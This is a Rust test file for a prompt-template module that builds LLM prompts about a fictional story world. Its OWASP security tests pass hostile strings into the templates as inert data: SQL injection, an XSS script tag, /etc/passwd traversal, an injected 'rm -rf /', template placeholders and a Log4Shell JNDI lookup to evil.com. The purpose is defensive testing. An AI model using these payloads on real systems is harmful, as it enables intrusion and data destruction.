// Prompt Templates Tests
//
// Tests for Phase 3: LLM Integration Layer - Prompt Engineering Framework
// - Template generation for different intent types
// - Context formatting and structure validation
// - Prompt quality and completeness
// - OWASP security compliance

use scribe_backend::{
    services::{
        prompt_templates::PromptTemplates,
        nlp_query_handler::IntentType,
    },
    models::world_model::*,
};

#[tokio::test]
async fn test_causal_reasoning_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "What caused the dragon to attack the village?";
    
    let prompt = PromptTemplates::causal_reasoning_prompt(&context, query);
    
    // Verify prompt structure
    assert!(prompt.contains("## Current World State"));
    assert!(prompt.contains("## Causal Chains Identified"));
    assert!(prompt.contains("## Recent World Changes"));
    assert!(prompt.contains("## Your Task"));
    assert!(prompt.contains("## Reasoning Guidelines"));
    assert!(prompt.contains("## Response Format"));
    
    // Verify query inclusion
    assert!(prompt.contains(query));
    
    // Verify reasoning guidance
    assert!(prompt.contains("Trace Causality"));
    assert!(prompt.contains("Consider Timing"));
    assert!(prompt.contains("Assess Confidence"));
    
    // Verify response structure guidance
    assert!(prompt.contains("Primary Cause(s)"));
    assert!(prompt.contains("Causal Chain"));
    assert!(prompt.contains("Supporting Evidence"));
    assert!(prompt.contains("Alternative Explanations"));
    assert!(prompt.contains("Confidence Assessment"));
}

#[tokio::test]
async fn test_relationship_analysis_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "What is the relationship between the king and the wizard?";
    
    let prompt = PromptTemplates::relationship_analysis_prompt(&context, query);
    
    // Verify prompt structure
    assert!(prompt.contains("## Entity Overview"));
    assert!(prompt.contains("## Relationship Network"));
    assert!(prompt.contains("## Recent Relationship Changes"));
    assert!(prompt.contains("## Spatial Context"));
    assert!(prompt.contains("## Analysis Framework"));
    assert!(prompt.contains("## Response Format"));
    
    // Verify query inclusion
    assert!(prompt.contains(query));
    
    // Verify relationship-specific guidance
    assert!(prompt.contains("Relationship Mapping"));
    assert!(prompt.contains("Strength Assessment"));
    assert!(prompt.contains("Network Effects"));
    
    // Verify response structure
    assert!(prompt.contains("Current Status"));
    assert!(prompt.contains("Relationship Dynamics"));
    assert!(prompt.contains("Historical Development"));
    assert!(prompt.contains("Future Outlook"));
}

#[tokio::test]
async fn test_temporal_analysis_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "What happened before the battle started?";
    
    let prompt = PromptTemplates::temporal_analysis_prompt(&context, query);
    
    // Verify temporal-specific sections
    assert!(prompt.contains("## Entities Involved"));
    assert!(prompt.contains("## Event Sequence"));
    assert!(prompt.contains("## Causal Relationships"));
    assert!(prompt.contains("## Timeline Analysis Guidelines"));
    
    // Verify temporal guidance
    assert!(prompt.contains("Chronological Order"));
    assert!(prompt.contains("Causal Dependencies"));
    assert!(prompt.contains("Entity State Changes"));
    assert!(prompt.contains("Critical Moments"));
    
    // Verify temporal response format
    assert!(prompt.contains("Timeline Overview"));
    assert!(prompt.contains("Detailed Progression"));
    assert!(prompt.contains("Key Turning Points"));
}

#[tokio::test]
async fn test_spatial_analysis_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "Where is the treasure located?";
    
    let prompt = PromptTemplates::spatial_analysis_prompt(&context, query);
    
    // Verify spatial-specific sections
    assert!(prompt.contains("## Entities and Their Locations"));
    assert!(prompt.contains("## Spatial Hierarchy"));
    assert!(prompt.contains("## Spatial Analysis Guidelines"));
    
    // Verify spatial guidance
    assert!(prompt.contains("Location Mapping"));
    assert!(prompt.contains("Spatial Relationships"));
    assert!(prompt.contains("Movement Patterns"));
    assert!(prompt.contains("Strategic Significance"));
    
    // Verify spatial response format
    assert!(prompt.contains("Location Overview"));
    assert!(prompt.contains("Spatial Relationships"));
    assert!(prompt.contains("Entity Positioning"));
}

#[tokio::test]
async fn test_quantitative_analysis_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "How many soldiers are in the army?";
    
    let prompt = PromptTemplates::quantitative_analysis_prompt(&context, query);
    
    // Verify quantitative-specific sections
    assert!(prompt.contains("## Entities and Their Attributes"));
    assert!(prompt.contains("## Relationship Network Stats"));
    assert!(prompt.contains("## Event Frequency and Patterns"));
    assert!(prompt.contains("## Quantitative Analysis Guidelines"));
    
    // Verify quantitative guidance
    assert!(prompt.contains("Count and Measure"));
    assert!(prompt.contains("Compare Quantities"));
    assert!(prompt.contains("Identify Patterns"));
    assert!(prompt.contains("Temporal Trends"));
    
    // Verify quantitative response format
    assert!(prompt.contains("Direct Counts"));
    assert!(prompt.contains("Comparative Analysis"));
    assert!(prompt.contains("Statistical Insights"));
}

#[tokio::test]
async fn test_comparative_analysis_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "Compare the strength of the two armies";
    
    let prompt = PromptTemplates::comparative_analysis_prompt(&context, query);
    
    // Verify comparative-specific sections
    assert!(prompt.contains("## Entities for Comparison"));
    assert!(prompt.contains("## Comparative Analysis Framework"));
    
    // Verify comparative guidance
    assert!(prompt.contains("Identify Comparison Points"));
    assert!(prompt.contains("Analyze Similarities"));
    assert!(prompt.contains("Contrast Differences"));
    assert!(prompt.contains("Assess Significance"));
    
    // Verify comparative response format
    assert!(prompt.contains("Key Similarities"));
    assert!(prompt.contains("Major Differences"));
    assert!(prompt.contains("Detailed Analysis"));
    assert!(prompt.contains("Relative Assessment"));
}

#[tokio::test]
async fn test_general_inquiry_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "Tell me about the current situation";
    
    let prompt = PromptTemplates::general_inquiry_prompt(&context, query);
    
    // Verify general sections
    assert!(prompt.contains("## Current World State"));
    assert!(prompt.contains("## Key Relationships"));
    assert!(prompt.contains("## Recent Developments"));
    assert!(prompt.contains("## Available Context"));
    assert!(prompt.contains("## General Analysis Guidelines"));
    
    // Verify general guidance
    assert!(prompt.contains("Comprehensive Review"));
    assert!(prompt.contains("Multiple Perspectives"));
    assert!(prompt.contains("Evidence-Based"));
    assert!(prompt.contains("Narrative Coherence"));
    
    // Verify general response format
    assert!(prompt.contains("Direct Answer"));
    assert!(prompt.contains("Supporting Evidence"));
    assert!(prompt.contains("Context Integration"));
}

#[tokio::test]
async fn test_intent_based_prompt_generation() {
    let context = create_sample_llm_context();
    let query = "Test query";
    
    // Test all intent types
    let intent_types = vec![
        IntentType::CausalReasoning,
        IntentType::RelationshipAnalysis,
        IntentType::TemporalQuery,
        IntentType::SpatialQuery,
        IntentType::QuantitativeQuery,
        IntentType::ComparativeQuery,
        IntentType::GeneralInquiry,
    ];
    
    for intent_type in intent_types {
        let prompt = PromptTemplates::generate_prompt_for_intent(&intent_type, &context, query);
        
        // Each prompt should be substantial and contain the query
        assert!(prompt.len() > 500, "Prompt for {:?} should be substantial", intent_type);
        assert!(prompt.contains(query), "Prompt for {:?} should contain the query", intent_type);
        assert!(prompt.contains("## Your Task"), "Prompt for {:?} should have task section", intent_type);
        assert!(prompt.contains("## Response Format"), "Prompt for {:?} should have response format", intent_type);
    }
}

#[tokio::test]
async fn test_context_formatting_with_empty_data() {
    // Test that prompt generation handles empty context gracefully
    let empty_context = LLMWorldContext {
        entity_summaries: vec![],
        relationship_graph: RelationshipGraph {
            nodes: vec![],
            edges: vec![],
            clusters: vec![],
        },
        causal_chains: vec![],
        spatial_context: SpatialContext::new(),
        recent_changes: vec![],
        reasoning_hints: vec![],
    };
    
    let query = "Test query with empty context";
    
    // Test each prompt type with empty context
    let prompts = vec![
        PromptTemplates::causal_reasoning_prompt(&empty_context, query),
        PromptTemplates::relationship_analysis_prompt(&empty_context, query),
        PromptTemplates::temporal_analysis_prompt(&empty_context, query),
        PromptTemplates::spatial_analysis_prompt(&empty_context, query),
        PromptTemplates::quantitative_analysis_prompt(&empty_context, query),
        PromptTemplates::comparative_analysis_prompt(&empty_context, query),
        PromptTemplates::general_inquiry_prompt(&empty_context, query),
    ];
    
    for prompt in prompts {
        // Should handle empty data gracefully with fallback messages
        assert!(prompt.contains("No entities currently available") || 
                prompt.contains("No relationships currently mapped") ||
                prompt.contains("No causal chains identified") ||
                prompt.contains("No spatial information available") ||
                prompt.contains("No relationship network data") ||
                prompt.contains("No event patterns available") ||
                prompt.contains("No recent changes recorded"));
        
        // Should still include the query and structure
        assert!(prompt.contains(query));
        assert!(prompt.contains("## Your Task"));
    }
}

#[tokio::test]
async fn test_context_formatting_with_rich_data() {
    let rich_context = create_rich_llm_context();
    let query = "Test query with rich context";
    
    let prompt = PromptTemplates::causal_reasoning_prompt(&rich_context, query);
    
    // Should include formatted entity information
    assert!(prompt.contains("Test Hero"));
    assert!(prompt.contains("Test Villain"));
    
    // Should include causal chain information
    assert!(prompt.contains("Hero defeats villain"));
    assert!(prompt.contains("Peace is restored"));
    assert!(prompt.contains("confidence: 90.0%"));
    
    // Should include recent changes
    assert!(prompt.contains("Hero gained experience"));
    assert!(prompt.contains("HIGH:"));
}

// OWASP Security Tests for Prompt Templates

#[tokio::test]
async fn test_prompt_templates_injection_resistance() {
    // A03: Injection - Test that malicious query content is safely included
    let context = create_sample_llm_context();
    let malicious_queries = vec![
        "'; DROP TABLE entities; --",
        "<script>alert('xss')</script>",
        "../../etc/passwd",
        "\"; rm -rf /",
        "{{config.secret_key}}",
        "${jndi:ldap://evil.com/a}",
    ];
    
    for malicious_query in malicious_queries {
        let prompt = PromptTemplates::causal_reasoning_prompt(&context, malicious_query);
        
        // Query should be included exactly as-is, not interpreted
        assert!(prompt.contains(malicious_query));
        
        // Should not contain any signs of injection execution
        assert!(!prompt.contains("ERROR"));
        assert!(!prompt.contains("SYNTAX"));
        
        // Should maintain proper prompt structure
        assert!(prompt.contains("## Your Task"));
        assert!(prompt.contains("## Response Format"));
    }
}

#[tokio::test]
async fn test_prompt_templates_data_integrity() {
    // A08: Software and Data Integrity Failures - Test data handling
    let mut malicious_context = create_sample_llm_context();
    
    // Add malicious data to context
    malicious_context.entity_summaries.push(EntitySummary::new(
        uuid::Uuid::new_v4(),
        "'; DROP TABLE users; --".to_string(),
        "Malicious Entity".to_string(),
        "<script>alert('xss')</script>".to_string(),
    ));
    
    malicious_context.reasoning_hints.push("{{config.database_password}}".to_string());
    
    let query = "Test query";
    let prompt = PromptTemplates::general_inquiry_prompt(&malicious_context, query);
    
    // Malicious data should be included safely as text, not executed
    assert!(prompt.contains("DROP TABLE users"));
    assert!(prompt.contains("<script>alert('xss')</script>"));
    assert!(prompt.contains("{{config.database_password}}"));
    
    // Should maintain structure despite malicious content
    assert!(prompt.contains("## Your Task"));
    assert!(prompt.contains("## Response Format"));
}

#[tokio::test]
async fn test_prompt_templates_memory_safety() {
    // Performance and DoS protection test
    let mut large_context = create_sample_llm_context();
    
    // Add large amounts of data
    for i in 0..1000 {
        large_context.entity_summaries.push(EntitySummary::new(
            uuid::Uuid::new_v4(),
            format!("Entity {}", i),
            "Test Type".to_string(),
            format!("State {}", i),
        ));
        
        large_context.reasoning_hints.push(format!("Hint number {}", i));
    }
    
    // Add very long individual items
    let long_name = "x".repeat(10000);
    large_context.entity_summaries.push(EntitySummary::new(
        uuid::Uuid::new_v4(),
        long_name,
        "Long Entity".to_string(),
        "Very long state description".to_string(),
    ));
    
    let start_time = std::time::Instant::now();
    let prompt = PromptTemplates::general_inquiry_prompt(&large_context, "Test query");
    let generation_time = start_time.elapsed();
    
    // Should handle large data without excessive time
    assert!(generation_time.as_secs() < 5, "Prompt generation should complete quickly");
    
    // Should include data but maintain reasonable structure
    assert!(prompt.contains("Entity 999"));
    assert!(prompt.contains("Hint number 999"));
    assert!(prompt.len() > 10000); // Should be substantial but not infinite
}

// Helper functions

fn create_sample_llm_context() -> LLMWorldContext {
    LLMWorldContext {
        entity_summaries: vec![],
        relationship_graph: RelationshipGraph {
            nodes: vec![],
            edges: vec![],
            clusters: vec![],
        },
        causal_chains: vec![],
        spatial_context: SpatialContext::new(),
        recent_changes: vec![],
        reasoning_hints: vec!["Consider the narrative context".to_string()],
    }
}

fn create_rich_llm_context() -> LLMWorldContext {
    let mut hero_summary = EntitySummary::new(
        uuid::Uuid::new_v4(),
        "Test Hero".to_string(),
        "Character".to_string(),
        "battle-ready".to_string(),
    );
    hero_summary.add_attribute("level".to_string(), "5".to_string());
    hero_summary.add_recent_action("Defeated the villain".to_string());
    
    let villain_summary = EntitySummary::new(
        uuid::Uuid::new_v4(),
        "Test Villain".to_string(),
        "Antagonist".to_string(),
        "defeated".to_string(),
    );
    
    let causal_chain = CausalChain::new(
        "Hero defeats villain".to_string(),
        "Peace is restored".to_string(),
        0.9,
    );
    
    let recent_change = RecentChange::new(
        "experience_gain".to_string(),
        Some(uuid::Uuid::new_v4()),
        "Hero gained experience".to_string(),
        "high".to_string(),
    );
    
    LLMWorldContext {
        entity_summaries: vec![hero_summary, villain_summary],
        relationship_graph: RelationshipGraph {
            nodes: vec![],
            edges: vec![],
            clusters: vec![],
        },
        causal_chains: vec![causal_chain],
        spatial_context: SpatialContext::new(),
        recent_changes: vec![recent_change],
        reasoning_hints: vec!["Focus on character motivations".to_string()],
    }
}